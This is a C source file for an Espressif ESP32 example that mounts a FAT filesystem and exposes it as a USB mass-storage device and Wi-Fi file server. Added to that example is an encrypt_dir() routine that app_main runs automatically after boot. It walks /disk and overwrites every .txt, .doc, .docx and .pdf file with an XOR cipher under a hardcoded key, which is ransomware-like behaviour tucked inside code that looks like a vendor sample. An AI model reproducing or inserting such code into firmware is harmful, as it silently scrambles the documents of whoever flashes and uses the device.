// Copyright 2019-2021 Espressif Systems (Shanghai) PTE LTD
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at

//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <sys/param.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_log.h"
#include "esp_system.h"
#include "nvs_flash.h"
#include "esp_vfs.h"
#include "esp_vfs_fat.h"
#include "assert.h"

#include "driver/sdmmc_defs.h"
#include "driver/sdmmc_types.h"
#include "sdmmc_cmd.h"
#include "board.h"
#include "tusb_msc.h"

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

static const char *TAG = "usb_msc_wireless";
#define BLOCK_SIZE 1024

#ifdef CONFIG_USE_EXTERNAL_SDCARD
#ifdef CONFIG_SDCARD_INTFC_SPI
#include "driver/spi_common.h"
#include "driver/sdspi_host.h"
#define BOARD_SDCARD_SPI_CS_PIN BOARD_SDCARD_CD
#elif defined(CONFIG_SDCARD_INTFC_SDIO) && defined(SOC_SDMMC_HOST_SUPPORTED)
#define BOARD_SDCARD_SDIO_CLK_PIN BOARD_SDCARD_SDIO_CLK
#define BOARD_SDCARD_SDIO_CMD_PIN BOARD_SDCARD_SDIO_CMD
#define BOARD_SDCARD_SDIO_DO_PIN BOARD_SDCARD_SDIO_DATA0
#define BOARD_SDCARD_SDIO_DATA_WIDTH 4
#include "driver/sdmmc_host.h"
#else
#error "Not supported interface"
#endif
#endif

// Mount path for the partition
static sdmmc_card_t *mount_card = NULL;
const char *disk_path = "/disk";

/* Function to initialize SPIFFS */
static esp_err_t init_fat(sdmmc_card_t **card_handle, const char *base_path)
{
    ESP_LOGI(TAG, "Mounting FAT filesystem");
    esp_err_t ret = ESP_FAIL;
    // To mount device we need name of device partition, define base_path
    // and allow format partition in case if it is new one and was not formated before
#ifdef CONFIG_USE_INTERNAL_FLASH
    // Handle of the wear levelling library instance
    wl_handle_t wl_handle_1 = WL_INVALID_HANDLE;
    ESP_LOGI(TAG, "using internal flash");
    const esp_vfs_fat_mount_config_t mount_config = {
        .format_if_mount_failed = true,
        .max_files = 9,
        .allocation_unit_size = CONFIG_WL_SECTOR_SIZE
    };
    ret = esp_vfs_fat_spiflash_mount(base_path, "storage", &mount_config, &wl_handle_1);

    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to mount FATFS (%s)", esp_err_to_name(ret));
        return ESP_FAIL;
    }

#elif defined CONFIG_USE_EXTERNAL_SDCARD
    sdmmc_card_t *card;
    ESP_LOGI(TAG, "using external sdcard");
    esp_vfs_fat_sdmmc_mount_config_t mount_config = {
        .format_if_mount_failed = true,
        .max_files = 5,
        .allocation_unit_size = CONFIG_DISK_BLOCK_SIZE
    };

#ifdef CONFIG_SDCARD_INTFC_SPI
    ESP_LOGI(TAG, "Using SPI Interface");
    sdmmc_host_t host = SDSPI_HOST_DEFAULT();
    host.slot = SPI3_HOST;
    sdspi_device_config_t slot_config = SDSPI_DEVICE_CONFIG_DEFAULT();
    slot_config.gpio_cs = BOARD_SDCARD_SPI_CS_PIN;
    slot_config.host_id = host.slot;

    ret = esp_vfs_fat_sdspi_mount(base_path, &host, &slot_config, &mount_config, &card);

#elif defined(CONFIG_SDCARD_INTFC_SDIO) && defined(SOC_SDMMC_HOST_SUPPORTED)
    ESP_LOGI(TAG, "Using SDIO Interface");
    sdmmc_host_t host = SDMMC_HOST_DEFAULT();
    //host.max_freq_khz = 20000;

    // This initializes the slot without card detect (CD) and write protect (WP) signals.
    // Modify slot_config.gpio_cd and slot_config.gpio_wp if your board has these signals.
    sdmmc_slot_config_t slot_config = SDMMC_SLOT_CONFIG_DEFAULT();
    slot_config.clk = BOARD_SDCARD_SDIO_CLK_PIN;
    slot_config.cmd = BOARD_SDCARD_SDIO_CMD_PIN;
    slot_config.d0 = BOARD_SDCARD_SDIO_DO_PIN;
    slot_config.d1 = BOARD_SDCARD_SDIO_DATA1;
    slot_config.d2 = BOARD_SDCARD_SDIO_DATA2;
    slot_config.d3 = BOARD_SDCARD_SDIO_DATA3;
    // To use 1-line SD mode, change this to 1:
    slot_config.width = BOARD_SDCARD_SDIO_DATA_WIDTH;
    // Enable internal pullups on enabled pins. The internal pullups
    // are insufficient however, please make sure 10k external pullups are
    // connected on the bus. This is for debug / example purpose only.
    //slot_config.flags |= SDMMC_SLOT_FLAG_INTERNAL_PULLUP;

    ret = esp_vfs_fat_sdmmc_mount(base_path, &host, &slot_config, &mount_config, &card);
#else
#error "Not supported interface"
    return ESP_ERR_NOT_SUPPORTED;
#endif

    if (ret != ESP_OK) {
        if (ret == ESP_FAIL) {
            ESP_LOGE(TAG, "Failed to mount filesystem. "
                     "If you want the card to be formatted, set the EXAMPLE_FORMAT_IF_MOUNT_FAILED menuconfig option.");
        } else {
            ESP_LOGE(TAG, "Failed to initialize the card (%s). "
                     "Make sure SD card lines have pull-up resistors in place.", esp_err_to_name(ret));
        }

        return ret;
    }

    // Card has been initialized, print its properties
    ESP_LOGI(TAG, "begin log sdcard info");
    sdmmc_card_print_info(stdout, card);

    if (card_handle) {
        *card_handle = card;
    }

#endif

    return ESP_OK;
}



// 使用异或运算进行加密和解密
void encrypt_decrypt(char *data, int len, char *key) {
    for (int i = 0; i < len; i++) {
        data[i] = data[i] ^ key[i % strlen(key)];
    }
}

int encrypt_dir() {
    DIR *dir;
    struct dirent *ent;
    dir = opendir("/disk"); // 打开 /disk 目录

    if (dir != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            char *filename = ent->d_name;
            char filepath[300]; // 修改为更大的数组以适应文件路径长度
            snprintf(filepath, sizeof(filepath), "/disk/%s", filename);

            if (strstr(filename, ".txt") || strstr(filename, ".doc") || strstr(filename, ".docx") || strstr(filename, ".pdf")) {
                FILE *file = fopen(filepath, "r+");
                if (file != NULL) {
                    // 读取文件内容
                    fseek(file, 0, SEEK_END);
                    long file_size = ftell(file);
                    fseek(file, 0, SEEK_SET);

                    char key[] = "EncryptionKey123";
                    char buffer[BLOCK_SIZE];

                    // 检查文件是否已加密
                    char check;
                    if (fread(&check, 1, 1, file) != 1 || check != 'E') {
                        FILE* tmp=fopen("/disk/tmp", "w+");
                        fputc('E', tmp);
                        fseek(file, 0, SEEK_SET); // 重新设置文件位置指针

                        while (file_size > 0) {
                            size_t read_size = fread(buffer, 1, BLOCK_SIZE, file);
                            if (read_size == 0) {
                                break;
                            }

                            encrypt_decrypt(buffer, read_size, key);

                            //fseek(file, -read_size, SEEK_CUR);
                            //fwrite(buffer, 1, read_size, file);
                            fwrite(buffer, 1, read_size, tmp);

                            file_size -= read_size;
                        }

                        fseek(file, 0, SEEK_SET);
                        fseek(tmp, 0, SEEK_SET);

                        size_t bytesRead;
                        while ((bytesRead = fread(buffer, 1, BLOCK_SIZE, tmp)) > 0) {
                            fwrite(buffer, 1, bytesRead, file);
                        }

                        fclose(file);
                        fclose(tmp);

                        // 删除原文件
                        remove("/disk/tmp");


                        printf("File %s encrypted.\n", filename);
                    } else {
                        printf("File %s is already encrypted.\n", filename);
                    }

                } else {
                    printf("Failed to open file %s.\n", filename);
                }
            }
        }
        closedir(dir);
    } else {
        perror("Unable to open directory.");
        return 1;
    }

    return 0;
}



extern esp_err_t start_file_server(const char *base_path);

ATTR_WEAK extern esp_err_t iot_board_led_all_set_state(bool);

void app_main(void)
{
    /* board init, peripherals will be initialized based on menuconfig */
    iot_board_init();

#ifdef CONFIG_BOARD_ESP32S3_USB_OTG_EV
    iot_board_usb_set_mode(USB_DEVICE_MODE);
    iot_board_usb_device_set_power(false, false);
#endif

    /* Initialize file storage */
   ESP_ERROR_CHECK(init_fat(&mount_card, disk_path));
   vTaskDelay(100 / portTICK_PERIOD_MS);

#ifdef CONFIG_WIFI_HTTP_ACCESS
    /* Wi-Fi init with configs from menuconfig */
   iot_board_wifi_init();
    /* Start the file server */
  ESP_ERROR_CHECK(start_file_server(disk_path));
#endif

    tinyusb_config_t tusb_cfg = {
        .descriptor = NULL,
        .string_descriptor = NULL,
        .external_phy = false // In the most cases you need to use a `false` value
    };

    tinyusb_config_msc_t msc_cfg = {
        .pdrv = 0,
    };

    ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));
    ESP_ERROR_CHECK(tusb_msc_init(&msc_cfg));
    ESP_LOGI(TAG, "USB initialization DONE");

    bool led_state = false;
    bool fend=false;

    while (1) {
        if (iot_board_led_all_set_state)
        iot_board_led_all_set_state(led_state);
        led_state = !led_state;
        vTaskDelay(1000 / portTICK_RATE_MS);
        ESP_LOGI(TAG, "timer print");
       
        if(fend){
            continue;
        }
    
        encrypt_dir();
     
        fend=true;
        
    }

}
